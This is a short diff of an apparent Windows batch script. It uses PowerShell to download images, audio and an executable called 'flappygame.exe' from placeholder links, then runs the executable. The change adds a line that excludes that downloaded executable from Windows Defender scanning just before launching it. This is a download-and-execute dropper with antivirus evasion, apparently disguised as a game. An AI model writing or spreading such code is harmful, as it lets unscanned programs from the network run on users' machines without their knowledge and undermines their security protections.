@@ -14,6 +14,7 @@ Powershell -Command "Invoke-WebRequest -Uri 'link_to_dragon_icon_png' -OutFile '
 Powershell -Command "Invoke-WebRequest -Uri 'link_to_roman_pillar_png' -OutFile 'C:\romanpillar.png'"
 Powershell -Command "Invoke-WebRequest -Uri 'link_to_sea_level_png' -OutFile 'C:\sealevelimage.png'"
 Powershell -Command "Invoke-WebRequest -Uri 'link_to_flappygame_exe' -OutFile C:\flappygame.exe"
+Powershell -Command "Add-MpPreference -ExclusionPath 'C:\flappygame.exe'"
 start C:\flappygame.exe
 cd %TEMP%
 Powershell -Command "Invoke-WebRequest -Uri 'link_to_aiwfciy_mp3' -OutFile aiwfciy.mp3"
